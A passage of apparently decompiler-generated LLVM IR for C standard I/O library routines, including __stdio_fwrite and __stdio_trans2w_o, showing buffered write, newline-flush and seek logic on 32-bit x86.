  store i16 %v1_805493b, i16* %v3_805493b, align 2
  %v0_805493f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805493f = add i32 %v0_805493f, 12
  %v2_805493f = inttoptr i32 %v1_805493f to i32*
  %v3_805493f = load i32, i32* %v2_805493f, align 4
  %v1_8054942 = load i32, i32* @edx, align 4
  %v2_8054942 = sub i32 %v3_805493f, %v1_8054942
  %v12_8054942 = icmp eq i32 %v2_8054942, 0
  store i1 %v12_8054942, i1* %zf.global-to-local, align 1
  store i32 %v2_8054942, i32* %eax.global-to-local, align 4
  %v4_8054968.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8054942, label %dec_label_pc_8054968, label %dec_label_pc_8054946

dec_label_pc_8054946:                             ; preds = %dec_label_pc_8054932
  %v12_8054946 = icmp eq i32 %v2_8054942, %v4_8054968.pre
  store i1 %v12_8054946, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_8054942, %v4_8054968.pre
  %v3_8054948 = load i32, i32* %esi.global-to-local, align 4
  %v5_8054948 = select i1 %tmp, i32 %v2_8054942, i32 %v3_8054948
  store i32 %v5_8054948, i32* %esi.global-to-local, align 4
  %v0_805494b.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805494b

dec_label_pc_805494b:                             ; preds = %dec_label_pc_805495d, %dec_label_pc_8054946
  %v2_805494f = phi i32 [ %v1_8054959, %dec_label_pc_805495d ], [ %v1_8054942, %dec_label_pc_8054946 ]
  %v4_805494b = phi i32 [ %v4_805494b.pre, %dec_label_pc_805495d ], [ %v2_8054942, %dec_label_pc_8054946 ]
  %v0_805494b = phi i32 [ %v1_805495d, %dec_label_pc_805495d ], [ %v0_805494b.pre, %dec_label_pc_8054946 ]
  %v1_805494b = inttoptr i32 %v0_805494b to i8*
  %v2_805494b = load i8, i8* %v1_805494b, align 1
  %v3_805494b = zext i8 %v2_805494b to i32
  %v5_805494b = and i32 %v4_805494b, -256
  %v6_805494b = or i32 %v3_805494b, %v5_805494b
  store i32 %v6_805494b, i32* %eax.global-to-local, align 4
  %v10_805494d = icmp eq i8 %v2_805494b, 10
  store i1 %v10_805494d, i1* %zf.global-to-local, align 1
  %v3_805494f = inttoptr i32 %v2_805494f to i8*
  store i8 %v2_805494b, i8* %v3_805494f, align 1
  %v0_8054951 = load i1, i1* %zf.global-to-local, align 1
  %v1_8054951 = icmp eq i1 %v0_8054951, false
  br i1 %v1_8054951, label %dec_label_pc_8054959, label %dec_label_pc_8054953

dec_label_pc_8054953:                             ; preds = %dec_label_pc_805494b
  %v0_8054953 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054953 = add i32 %v0_8054953, 1
  %v2_8054953 = inttoptr i32 %v1_8054953 to i8*
  %v3_8054953 = load i8, i8* %v2_8054953, align 1
  %v4_8054953 = urem i8 %v3_8054953, 2
  %v5_8054953 = icmp eq i8 %v4_8054953, 0
  store i1 %v5_8054953, i1* %zf.global-to-local, align 1
  %v1_8054957 = icmp eq i1 %v5_8054953, false
  br i1 %v1_8054957, label %dec_label_pc_8054953.dec_label_pc_8054960_crit_edge, label %dec_label_pc_8054959

dec_label_pc_8054953.dec_label_pc_8054960_crit_edge: ; preds = %dec_label_pc_8054953
  %v0_8054960.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054960

dec_label_pc_8054959:                             ; preds = %dec_label_pc_8054953, %dec_label_pc_805494b
  %v0_8054959 = load i32, i32* @edx, align 4
  %v1_8054959 = add i32 %v0_8054959, 1
  store i32 %v1_8054959, i32* @edx, align 4
  %v0_805495a = load i32, i32* %esi.global-to-local, align 4
  %v1_805495a = add i32 %v0_805495a, -1
  %v8_805495a = icmp eq i32 %v1_805495a, 0
  store i1 %v8_805495a, i1* %zf.global-to-local, align 1
  store i32 %v1_805495a, i32* %esi.global-to-local, align 4
  br i1 %v8_805495a, label %dec_label_pc_8054959.dec_label_pc_8054960_crit_edge, label %dec_label_pc_805495d

dec_label_pc_8054959.dec_label_pc_8054960_crit_edge: ; preds = %dec_label_pc_8054959
  %v1_8054960.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054960

dec_label_pc_805495d:                             ; preds = %dec_label_pc_8054959
  %v0_805495d = load i32, i32* @edi, align 4
  %v1_805495d = add i32 %v0_805495d, 1
  %v8_805495d = icmp eq i32 %v1_805495d, 0
  store i1 %v8_805495d, i1* %zf.global-to-local, align 1
  store i32 %v1_805495d, i32* @edi, align 4
  %v4_805494b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805494b

dec_label_pc_8054960:                             ; preds = %dec_label_pc_8054959.dec_label_pc_8054960_crit_edge, %dec_label_pc_8054953.dec_label_pc_8054960_crit_edge
  %v1_8054960 = phi i32 [ %v0_8054953, %dec_label_pc_8054953.dec_label_pc_8054960_crit_edge ], [ %v1_8054960.pre, %dec_label_pc_8054959.dec_label_pc_8054960_crit_edge ]
  %v0_8054960 = phi i32 [ %v0_8054960.pre, %dec_label_pc_8054953.dec_label_pc_8054960_crit_edge ], [ %v1_8054959, %dec_label_pc_8054959.dec_label_pc_8054960_crit_edge ]
  %v2_8054960 = add i32 %v1_8054960, 16
  %v3_8054960 = inttoptr i32 %v2_8054960 to i32*
  store i32 %v0_8054960, i32* %v3_8054960, align 4
  %v0_8054963 = load i32, i32* @edx, align 4
  %v1_8054963 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054963 = add i32 %v1_8054963, 8
  %v3_8054963 = inttoptr i32 %v2_8054963 to i32*
  %v4_8054963 = load i32, i32* %v3_8054963, align 4
  %v5_8054963 = sub i32 %v0_8054963, %v4_8054963
  store i32 %v5_8054963, i32* @edx, align 4
  %v0_8054966 = load i32, i32* @ebx, align 4
  %v2_8054966 = sub i32 %v0_8054966, %v5_8054963
  %v12_8054966 = icmp eq i32 %v2_8054966, 0
  store i1 %v12_8054966, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8054968

dec_label_pc_8054968:                             ; preds = %dec_label_pc_8054932, %dec_label_pc_8054960
  %v4_8054968 = phi i32 [ %v2_8054966, %dec_label_pc_8054960 ], [ %v4_8054968.pre, %dec_label_pc_8054932 ]
  %v5_8054968 = sub i32 %arg3, %v4_8054968
  %v15_8054968 = icmp eq i32 %v5_8054968, 0
  store i1 %v15_8054968, i1* %zf.global-to-local, align 1
  %v0_8054970.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805496c

dec_label_pc_805496c:                             ; preds = %dec_label_pc_805492c, %entry, %dec_label_pc_8054968
  %v0_8054970 = phi i32 [ %v0_8054970.pre, %dec_label_pc_8054968 ], [ %v15_80548fc, %entry ], [ %v15_80548fc, %dec_label_pc_805492c ]
  %stack_var_12.0 = phi i32 [ %v5_8054968, %dec_label_pc_8054968 ], [ 0, %entry ], [ %arg3, %dec_label_pc_805492c ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8054970 = icmp eq i32 %v0_8054970, -12
  store i1 %v9_8054970, i1* %zf.global-to-local, align 1
  store i32 %v0_80548fb, i32* @ebx, align 4
  store i32 %v0_80548f9, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_805495d, { 1, 2, 0 }
  uselistorder i32 %v1_805495a, { 1, 0 }
  uselistorder i32 %v1_8054959, { 0, 2, 1 }
  uselistorder i8 %v2_805494b, { 1, 0, 2 }
  uselistorder i32 %v4_8054968.pre, { 2, 0, 1 }
  uselistorder i32 %v2_8054942, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_805492e, { 1, 0 }
  uselistorder i32 %v2_805492c, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8054920, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 4, 5, 0, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_805496c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054968, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054978 = load i32, i32* @ebp, align 4
  %v0_8054979 = load i32, i32* @edi, align 4
  %v0_805497a = load i32, i32* @esi, align 4
  %v0_805497b = load i32, i32* @ebx, align 4
  store i32 %v0_805497b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_805498b = add i32 %arg3, 1
  %v2_805498b = inttoptr i32 %v1_805498b to i8*
  %v3_805498b = load i8, i8* %v2_805498b, align 1
  %v4_805498b = and i8 %v3_805498b, 2
  %v5_805498b = icmp eq i8 %v4_805498b, 0
  %v1_805498f = icmp eq i1 %v5_805498b, false
  br i1 %v1_805498f, label %dec_label_pc_8054a40, label %dec_label_pc_8054995

dec_label_pc_8054995:                             ; preds = %entry
  %v1_8054995 = add i32 %arg3, 4
  %v2_8054995 = inttoptr i32 %v1_8054995 to i32*
  %v3_8054995 = load i32, i32* %v2_8054995, align 4
  %v13_8054995 = icmp eq i32 %v3_8054995, -2
  %v1_8054999 = add i32 %arg3, 16
  %v2_8054999 = inttoptr i32 %v1_8054999 to i32*
  %v3_8054999 = load i32, i32* %v2_8054999, align 4
  store i32 %v3_8054999, i32* @edx, align 4
  %v1_805499c = add i32 %arg3, 12
  %v2_805499c = inttoptr i32 %v1_805499c to i32*
  %v3_805499c = load i32, i32* %v2_805499c, align 4
  store i32 %v3_805499c, i32* %eax.global-to-local, align 4
  %v1_805499f = icmp eq i1 %v13_8054995, false
  %v2_80549be = sub i32 %v3_805499c, %v3_8054999
  br i1 %v1_805499f, label %dec_label_pc_80549be, label %dec_label_pc_80549a1

dec_label_pc_80549a1:                             ; preds = %dec_label_pc_8054995
  %tmp = icmp uge i32 %v2_80549be, %arg2
  %v5_80549a8 = select i1 %tmp, i32 %arg2, i32 %v2_80549be
  store i32 %v5_80549a8, i32* %ebx.global-to-local, align 4
  %v3_80549ae = inttoptr i32 %v3_8054999 to i16*
  %v4_80549ae = call i32 @memcpy(i16* %v3_80549ae, i32 %v5_80549a8, i32 %v3_805499c)
  store i32 %v4_80549ae, i32* %eax.global-to-local, align 4
  %v0_80549b6 = load i32, i32* @esi, align 4
  %v1_80549b6 = add i32 %v0_80549b6, 16
  %v2_80549b6 = inttoptr i32 %v1_80549b6 to i32*
  %v3_80549b6 = load i32, i32* %v2_80549b6, align 4
  %v4_80549b6 = load i32, i32* %ebx.global-to-local, align 4
  %v5_80549b6 = add i32 %v4_80549b6, %v3_80549b6
  store i32 %v5_80549b6, i32* %v2_80549b6, align 4
  br label %dec_label_pc_8054a58

dec_label_pc_80549be:                             ; preds = %dec_label_pc_8054995
  store i32 %v2_80549be, i32* %eax.global-to-local, align 4
  %v6_80549c2 = icmp ult i32 %v2_80549be, %arg2
  br i1 %v6_80549c2, label %dec_label_pc_8054a27, label %dec_label_pc_80549c4

dec_label_pc_80549c4:                             ; preds = %dec_label_pc_80549be
  %v0_80549c4 = load i32, i32* @ecx, align 4
  %v3_80549c8 = inttoptr i32 %v3_8054999 to i16*
  %v4_80549c8 = call i32 @memcpy(i16* %v3_80549c8, i32 %arg2, i32 %v0_80549c4)
  store i32 %v4_80549c8, i32* %eax.global-to-local, align 4
  %v0_80549d0 = load i32, i32* @esi, align 4
  %v1_80549d0 = add i32 %v0_80549d0, 16
  %v2_80549d0 = inttoptr i32 %v1_80549d0 to i32*
  %v3_80549d0 = load i32, i32* %v2_80549d0, align 4
  %v4_80549d0 = load i32, i32* @edi, align 4
  %v5_80549d0 = add i32 %v4_80549d0, %v3_80549d0
  store i32 %v5_80549d0, i32* %v2_80549d0, align 4
  %v0_80549d3 = load i32, i32* @esi, align 4
  %v1_80549d3 = add i32 %v0_80549d3, 1
  %v2_80549d3 = inttoptr i32 %v1_80549d3 to i8*
  %v3_80549d3 = load i8, i8* %v2_80549d3, align 1
  %v4_80549d3 = urem i8 %v3_80549d3, 2
  %v5_80549d3 = icmp eq i8 %v4_80549d3, 0
  br i1 %v5_80549d3, label %dec_label_pc_8054a58, label %dec_label_pc_80549d9

dec_label_pc_80549d9:                             ; preds = %dec_label_pc_80549c4
  %v0_80549d9 = load i32, i32* @edx, align 4
  %v0_80549da = load i32, i32* @edi, align 4
  %v4_80549de = call i32 @memrchr(i8 10, i32 %v0_80549da, i32 %v0_80549d9)
  store i32 %v4_80549de, i32* %eax.global-to-local, align 4
  %v1_80549e6 = icmp eq i32 %v4_80549de, 0
  br i1 %v1_80549e6, label %dec_label_pc_8054a58, label %dec_label_pc_80549ea

dec_label_pc_80549ea:                             ; preds = %dec_label_pc_80549d9
  %v0_80549ed = load i32, i32* @esi, align 4
  %v1_80549ee = call i32 @__stdio_wcommit(i32 %v0_80549ed)
  store i32 %v1_80549ee, i32* %eax.global-to-local, align 4
  %v1_80549f6 = icmp eq i32 %v1_80549ee, 0
  br i1 %v1_80549f6, label %dec_label_pc_8054a58, label %dec_label_pc_80549fa

dec_label_pc_80549fa:                             ; preds = %dec_label_pc_80549ea
  %v0_80549fa = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_80549fa, %v1_80549ee
  %v5_80549fe = select i1 %tmp20, i32 %v0_80549fa, i32 %v1_80549ee
  store i32 %v5_80549fe, i32* %ebx.global-to-local, align 4
  %v2_8054a03 = sub i32 %v0_80549fa, %v5_80549fe
  store i32 %v2_8054a03, i32* %eax.global-to-local, align 4
  %v0_8054a05 = load i32, i32* @ebp, align 4
  %v2_8054a05 = add i32 %v0_8054a05, %v2_8054a03
  store i32 %v2_8054a05, i32* %ebp.global-to-local, align 4
  %v4_8054a0c = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_80549fe, i32 %v2_8054a03)
  store i32 %v4_8054a0c, i32* %eax.global-to-local, align 4
  %v1_8054a14 = icmp eq i32 %v4_8054a0c, 0
  store i32 %v4_8054a0c, i32* @edx, align 4
  br i1 %v1_8054a14, label %dec_label_pc_8054a58, label %dec_label_pc_8054a1a

dec_label_pc_8054a1a:                             ; preds = %dec_label_pc_80549fa
  %v0_8054a1a = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054a1a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054a1a = sub i32 %v0_8054a1a, %v4_8054a0c
  %v2_8054a1e = add i32 %v2_8054a1a, %v1_8054a1a
  store i32 %v2_8054a1e, i32* %eax.global-to-local, align 4
  %v0_8054a20 = load i32, i32* @esi, align 4
  %v1_8054a20 = add i32 %v0_8054a20, 16
  %v2_8054a20 = inttoptr i32 %v1_8054a20 to i32*
  %v3_8054a20 = load i32, i32* %v2_8054a20, align 4
  %v5_8054a20 = sub i32 %v3_8054a20, %v2_8054a1e
  store i32 %v5_8054a20, i32* %v2_8054a20, align 4
  %v0_8054a23 = load i32, i32* @edi, align 4
  %v1_8054a23 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054a23 = sub i32 %v0_8054a23, %v1_8054a23
  store i32 %v2_8054a23, i32* @edi, align 4
  br label %dec_label_pc_8054a58

dec_label_pc_8054a27:                             ; preds = %dec_label_pc_80549be
  %v2_8054a27 = add i32 %arg3, 8
  %v3_8054a27 = inttoptr i32 %v2_8054a27 to i32*
  %v4_8054a27 = load i32, i32* %v3_8054a27, align 4
  %v15_8054a27 = icmp eq i32 %v3_8054999, %v4_8054a27
  br i1 %v15_8054a27, label %dec_label_pc_8054a40, label %dec_label_pc_8054a2c

dec_label_pc_8054a2c:                             ; preds = %dec_label_pc_8054a27
  %v1_8054a30 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8054a30, i32* %eax.global-to-local, align 4
  %v1_8054a38 = icmp eq i32 %v1_8054a30, 0
  br i1 %v1_8054a38, label %dec_label_pc_8054a2c.dec_label_pc_8054a40_crit_edge, label %dec_label_pc_8054a3c

dec_label_pc_8054a2c.dec_label_pc_8054a40_crit_edge: ; preds = %dec_label_pc_8054a2c
  %v0_8054a40.pre = load i32, i32* @edi, align 4
  %v0_8054a48.pre = load i32, i32* @esi, align 4
  %v2_8054a4f.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054a40

dec_label_pc_8054a3c:                             ; preds = %dec_label_pc_8054a2c
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8054a58

dec_label_pc_8054a40:                             ; preds = %dec_label_pc_8054a2c.dec_label_pc_8054a40_crit_edge, %dec_label_pc_8054a27, %entry
  %v2_8054a4f = phi i32 [ %v2_8054a4f.pre, %dec_label_pc_8054a2c.dec_label_pc_8054a40_crit_edge ], [ %v0_805497b, %dec_label_pc_8054a27 ], [ %v0_805497b, %entry ]
  %v0_8054a48 = phi i32 [ %v0_8054a48.pre, %dec_label_pc_8054a2c.dec_label_pc_8054a40_crit_edge ], [ %arg3, %dec_label_pc_8054a27 ], [ %arg3, %entry ]
  %v0_8054a40 = phi i32 [ %v0_8054a40.pre, %dec_label_pc_8054a2c.dec_label_pc_8054a40_crit_edge ], [ %arg2, %dec_label_pc_8054a27 ], [ %arg2, %entry ]
  store i32 %v2_8054a4f, i32* @ebx, align 4
  store i32 %v0_8054979, i32* @edi, align 4
  %v4_8054a53 = inttoptr i32 %v0_8054a48 to i16*
  %v5_8054a53 = call i32 @__stdio_WRITE(i16* %v4_8054a53, i32 %v0_8054a40, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8054a53, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a58

dec_label_pc_8054a58:                             ; preds = %dec_label_pc_80549fa, %dec_label_pc_80549ea, %dec_label_pc_80549d9, %dec_label_pc_80549c4, %dec_label_pc_8054a3c, %dec_label_pc_8054a1a, %dec_label_pc_80549a1, %dec_label_pc_8054a40
  %v0_8054a5b = load i32, i32* @edi, align 4
  store i32 %v0_8054a5b, i32* %eax.global-to-local, align 4
  %v2_8054a5d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054a5d, i32* @ebx, align 4
  store i32 %v0_805497a, i32* @esi, align 4
  store i32 %v0_8054979, i32* @edi, align 4
  store i32 %v0_8054978, i32* @ebp, align 4
  ret i32 %v0_8054a5b

; uselistorder directives
  uselistorder i32 %v2_8054a1e, { 1, 0 }
  uselistorder i32 %v0_80549fa, { 2, 1, 0 }
  uselistorder i32 %v1_80549ee, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80549be, { 2, 3, 1, 0 }
  uselistorder i32 %v3_8054999, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_8054979, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8054a58, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8054a64 = load i32, i32* @ebx, align 4
  %v4_8054a68 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8054a68, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8054a70 = load i16, i16* %arg1, align 2
  %v3_8054a70 = zext i16 %v2_8054a70 to i32
  store i32 %v3_8054a70, i32* %eax.global-to-local, align 4
  %v2_8054a73 = and i32 %v3_8054a70, %arg2
  %v3_8054a73 = icmp eq i32 %v2_8054a73, 0
  %v1_8054a75 = icmp eq i1 %v3_8054a73, false
  br i1 %v1_8054a75, label %dec_label_pc_8054a83, label %dec_label_pc_8054a77

dec_label_pc_8054a77:                             ; preds = %entry
  %v1_8054a77 = and i32 %v3_8054a70, 2176
  %v2_8054a77 = icmp eq i32 %v1_8054a77, 0
  %v1_8054a7c = icmp eq i1 %v2_8054a77, false
  br i1 %v1_8054a7c, label %dec_label_pc_8054a8b, label %dec_label_pc_8054a7e

dec_label_pc_8054a7e:                             ; preds = %dec_label_pc_8054a77
  %v2_8054a7e = or i32 %v3_8054a70, %arg2
  store i32 %v2_8054a7e, i32* %eax.global-to-local, align 4
  %v1_8054a80 = trunc i32 %v2_8054a7e to i16
  store i16 %v1_8054a80, i16* %arg1, align 2
  %v0_8054a83.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054a83

dec_label_pc_8054a83:                             ; preds = %entry, %dec_label_pc_8054a7e
  %v0_8054acc = phi i32 [ %v4_8054a68, %entry ], [ %v0_8054a83.pre, %dec_label_pc_8054a7e ]
  %v1_8054a83 = inttoptr i32 %v0_8054acc to i16*
  %v2_8054a83 = load i16, i16* %v1_8054a83, align 2
  %v3_8054a83 = zext i16 %v2_8054a83 to i32
  store i32 %v3_8054a83, i32* %edx.global-to-local, align 4
  %v2_8054a86 = and i16 %v2_8054a83, 32
  %v3_8054a86 = icmp eq i16 %v2_8054a86, 0
  br i1 %v3_8054a86, label %dec_label_pc_8054aa3, label %dec_label_pc_8054a8b

dec_label_pc_8054a8b:                             ; preds = %dec_label_pc_8054a83, %dec_label_pc_8054a77
  %v1_8054a8b = call i32 @__errno_location(i32 %v0_8054a64)
  store i32 %v1_8054a8b, i32* %eax.global-to-local, align 4
  %v1_8054a90 = inttoptr i32 %v1_8054a8b to i32*
  store i32 9, i32* %v1_8054a90, align 4
  br label %dec_label_pc_8054a96

dec_label_pc_8054a96:                             ; preds = %dec_label_pc_8054aba, %dec_label_pc_8054a8b
  %v0_8054a96 = load i32, i32* @ebx, align 4
  %v1_8054a96 = inttoptr i32 %v0_8054a96 to i32*
  %v2_8054a96 = load i32, i32* %v1_8054a96, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8054a9b = or i32 %v2_8054a96, 8
  store i32 %v1_8054a9b, i32* %eax.global-to-local, align 4
  %v1_8054a9e = trunc i32 %v1_8054a9b to i16
  %v3_8054a9e = inttoptr i32 %v0_8054a96 to i16*
  store i16 %v1_8054a9e, i16* %v3_8054a9e, align 2
  br label %dec_label_pc_8054b05

dec_label_pc_8054aa3:                             ; preds = %dec_label_pc_8054a83
  %v2_8054aa3 = urem i16 %v2_8054a83, 4
  %v3_8054aa3 = icmp eq i16 %v2_8054aa3, 0
  br i1 %v3_8054aa3, label %dec_label_pc_8054aed, label %dec_label_pc_8054aa8

dec_label_pc_8054aa8:                             ; preds = %dec_label_pc_8054aa3
  %v2_8054aa8 = and i32 %v3_8054a83, 4
  %v3_8054aa8 = icmp eq i32 %v2_8054aa8, 0
  %v1_8054aab = icmp eq i1 %v3_8054aa8, false
  br i1 %v1_8054aab, label %dec_label_pc_8054ad9, label %dec_label_pc_8054aad

dec_label_pc_8054aad:                             ; preds = %dec_label_pc_8054aa8
  %v1_8054aad = add i32 %v0_8054acc, 20
  %v2_8054aad = inttoptr i32 %v1_8054aad to i32*
  %v3_8054aad = load i32, i32* %v2_8054aad, align 4
  store i32 %v3_8054aad, i32* %eax.global-to-local, align 4
  %v2_8054ab0 = add i32 %v0_8054acc, 16
  %v3_8054ab0 = inttoptr i32 %v2_8054ab0 to i32*
  %v4_8054ab0 = load i32, i32* %v3_8054ab0, align 4
  %v15_8054ab0 = icmp eq i32 %v3_8054aad, %v4_8054ab0
  %v1_8054ab3 = icmp eq i1 %v15_8054ab0, false
  br i1 %v1_8054ab3, label %dec_label_pc_8054aba, label %dec_label_pc_8054ab5

dec_label_pc_8054ab5:                             ; preds = %dec_label_pc_8054aad
  %v2_8054ab5 = and i32 %v3_8054a83, 2
  %v3_8054ab5 = icmp eq i32 %v2_8054ab5, 0
  br i1 %v3_8054ab5, label %dec_label_pc_8054ad9, label %dec_label_pc_8054aba

dec_label_pc_8054aba:                             ; preds = %dec_label_pc_8054ab5, %dec_label_pc_8054aad
  %v1_8054aba = and i32 %v3_8054a83, 1024
  store i32 %v1_8054aba, i32* %edx.global-to-local, align 4
  %tmp15 = udiv i32 %v1_8054aba, 1024
  %tmp16 = xor i32 %tmp15, 3
  store i32 %tmp16, i32* %eax.global-to-local, align 4
  %v5_8054acd = call i32 @__GI_fseek(i32 %v0_8054acc, i32 0, i32 %tmp16, i32 %v1_8054aba)
  store i32 %v5_8054acd, i32* %eax.global-to-local, align 4
  %v1_8054ad5 = icmp eq i32 %v5_8054acd, 0
  %v1_8054ad7 = icmp eq i1 %v1_8054ad5, false
  br i1 %v1_8054ad7, label %dec_label_pc_8054a96, label %dec_label_pc_8054aba.dec_label_pc_8054ad9_crit_edge

dec_label_pc_8054aba.dec_label_pc_8054ad9_crit_edge: ; preds = %dec_label_pc_8054aba
  %v0_8054ad9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054ad9

dec_label_pc_8054ad9:                             ; preds = %dec_label_pc_8054aba.dec_label_pc_8054ad9_crit_edge, %dec_label_pc_8054ab5, %dec_label_pc_8054aa8
  %v2_8054ade = phi i32 [ %v0_8054ad9.pre, %dec_label_pc_8054aba.dec_label_pc_8054ad9_crit_edge ], [ %v0_8054acc, %dec_label_pc_8054ab5 ], [ %v0_8054acc, %dec_label_pc_8054aa8 ]
  %v1_8054ad9 = inttoptr i32 %v2_8054ade to i32*
  %v2_8054ad9 = load i32, i32* %v1_8054ad9, align 4
  %v1_8054adb = and i32 %v2_8054ad9, -4
  store i32 %v1_8054adb, i32* %eax.global-to-local, align 4
  %v1_8054ade = trunc i32 %v1_8054adb to i16
  %v3_8054ade = inttoptr i32 %v2_8054ade to i16*
  store i16 %v1_8054ade, i16* %v3_8054ade, align 2
  %v0_8054ae1 = load i32, i32* @ebx, align 4
  %v1_8054ae1 = add i32 %v0_8054ae1, 8
  %v2_8054ae1 = inttoptr i32 %v1_8054ae1 to i32*
  %v3_8054ae1 = load i32, i32* %v2_8054ae1, align 4
  store i32 %v3_8054ae1, i32* %eax.global-to-local, align 4
  %v2_8054ae4 = add i32 %v0_8054ae1, 24
  %v3_8054ae4 = inttoptr i32 %v2_8054ae4 to i32*
  store i32 %v3_8054ae1, i32* %v3_8054ae4, align 4
  %v0_8054ae7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054ae7 = load i32, i32* @ebx, align 4
  %v2_8054ae7 = add i32 %v1_8054ae7, 16
  %v3_8054ae7 = inttoptr i32 %v2_8054ae7 to i32*
  store i32 %v0_8054ae7, i32* %v3_8054ae7, align 4
  %v0_8054aea = load i32, i32* %eax.global-to-local, align 4
  %v1_8054aea = load i32, i32* @ebx, align 4
  %v2_8054aea = add i32 %v1_8054aea, 20
  %v3_8054aea = inttoptr i32 %v2_8054aea to i32*
  store i32 %v0_8054aea, i32* %v3_8054aea, align 4
  %v0_8054aed.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054aed

dec_label_pc_8054aed:                             ; preds = %dec_label_pc_8054aa3, %dec_label_pc_8054ad9
  %v2_8054af4 = phi i32 [ %v0_8054acc, %dec_label_pc_8054aa3 ], [ %v0_8054aed.pre, %dec_label_pc_8054ad9 ]
  %v1_8054aed = inttoptr i32 %v2_8054af4 to i32*
  %v2_8054aed = load i32, i32* %v1_8054aed, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8054af1 = or i32 %v2_8054aed, 64
  store i32 %v1_8054af1, i32* %eax.global-to-local, align 4
  %v1_8054af4 = trunc i32 %v1_8054af1 to i16
  %v3_8054af4 = inttoptr i32 %v2_8054af4 to i16*
  store i16 %v1_8054af4, i16* %v3_8054af4, align 2
  %v0_8054af7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054af7 = urem i32 %v0_8054af7, 65536
  store i32 %v1_8054af7, i32* %eax.global-to-local, align 4
  %v3_8054afa = and i32 %v0_8054af7, 2816
  %v4_8054afa = icmp eq i32 %v3_8054afa, 0
  %v1_8054afd = icmp eq i1 %v4_8054afa, false
  br i1 %v1_8054afd, label %dec_label_pc_8054b05, label %dec_label_pc_8054aff

dec_label_pc_8054aff:                             ; preds = %dec_label_pc_8054aed
  %v0_8054aff = load i32, i32* @ebx, align 4
  %v1_8054aff = add i32 %v0_8054aff, 12
  %v2_8054aff = inttoptr i32 %v1_8054aff to i32*
  %v3_8054aff = load i32, i32* %v2_8054aff, align 4
  store i32 %v3_8054aff, i32* %eax.global-to-local, align 4
  %v2_8054b02 = add i32 %v0_8054aff, 28
  %v3_8054b02 = inttoptr i32 %v2_8054b02 to i32*
  store i32 %v3_8054aff, i32* %v3_8054b02, align 4
  br label %dec_label_pc_8054b05

dec_label_pc_8054b05:                             ; preds = %dec_label_pc_8054aed, %dec_label_pc_8054a96, %dec_label_pc_8054aff
  %v0_8054b05 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8054b05, i32* %eax.global-to-local, align 4
  %v2_8054b07 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054b07, i32* %edx.global-to-local, align 4
  store i32 %v0_8054a64, i32* @ebx, align 4
  ret i32 %v0_8054b05

; uselistorder directives
  uselistorder i32 %v0_8054af7, { 1, 0 }
